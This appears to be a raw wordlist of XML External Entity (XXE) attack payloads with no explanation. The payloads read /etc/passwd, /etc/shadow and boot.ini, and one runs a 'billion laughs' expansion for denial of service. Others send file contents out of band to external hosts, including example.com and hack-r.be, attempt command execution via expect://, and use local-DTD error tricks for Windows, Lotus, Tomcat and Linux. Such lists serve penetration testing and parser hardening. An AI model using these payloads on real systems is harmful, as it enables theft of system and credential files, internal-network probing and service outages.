<?xml version="1.0"?> <!DOCTYPE data [ <!ELEMENT data (#ANY)> <!ENTITY file SYSTEM "file:///etc/passwd"> ]> <data>&file;</data>
<?xml version="1.0" encoding="ISO-8859-1"?>   <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<!--?xml version="1.0" ?--> <userInfo>  <firstName>John</firstName>  <lastName>Doe</lastName> </userInfo>
<!--?xml version="1.0" ?--> <!DOCTYPE replace [<!ENTITY example "Doe"> ]>  <userInfo>   <firstName>John</firstName>   <lastName>&example;</lastName>  </userInfo>
<!--?xml version="1.0" ?--> <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]> <userInfo>  <firstName>John</firstName>  <lastName>&ent;</lastName> </userInfo>
<!--?xml version="1.0" ?--> <!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>   <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;">   <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">   <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">   <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">   <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">   <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">   <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">   <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">   <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"> ]> <tag>&lol9;</tag>
<?xml version="1.0"?> <!DOCTYPE foo [   <!ELEMENT foo (#ANY)> <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0"?> <!DOCTYPE foo [ <!ELEMENT foo (#ANY)> <!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
<?xml version="1.0"?> <!DOCTYPE foo [ <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]> <foo><result>&ac;</result></foo>
<?xml version="1.0"?> <!DOCTYPE foo [   <!ELEMENT foo (#ANY)> <!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
<?xml version="1.0"?> <!DOCTYPE lolz [ <!ENTITY test SYSTEM "https://example.com/entity1.xml">]> <lolz><lol>3..2..1...&test<lol></lolz>
<?xml version="1.0" encoding="UTF-7"?> +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4 +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+ +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
<soap:Body>   <foo>     <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>   </foo> </soap:Body>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">     <image xlink:href="expect://ls"></image> </svg>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">     <!ENTITY % CIMName '>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ELEMENT aa "bb"'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\wmi20.dtd">     <!ENTITY % CIMName '>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ELEMENT aa "bb"'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\wmi20.dtd">     <!ENTITY % CIMName '>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ELEMENT aa "bb"'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///C:\Program Files (x86)\Lotus\Notes\domino.dtd">     <!ENTITY % boolean '(aa) #IMPLIED>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ATTLIST attxx aa "bb"'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///C:\Program Files (x86)\Lotus\Notes\domino.dtd">     <!ENTITY % boolean '(aa) #IMPLIED>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ATTLIST attxx aa "bb"'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\xwizard.dtd">     <!ENTITY % onerrortypes '(aa) #IMPLIED>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ATTLIST attxx aa "bb"'>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">     <!ENTITY % ISOamsa '         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         '>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">     <!ENTITY % ISOamsa '         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         '>     %local_dtd; ]> <message></message>
<!DOCTYPE message [     <!ENTITY % local_dtd SYSTEM "file:///usr/local/tomcat/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">     <!ENTITY % URI '(aa) #IMPLIED>         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">         <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">         &#x25;eval;         &#x25;error;         <!ATTLIST attxx aa "bb"'>     %local_dtd; ]> <message></message>
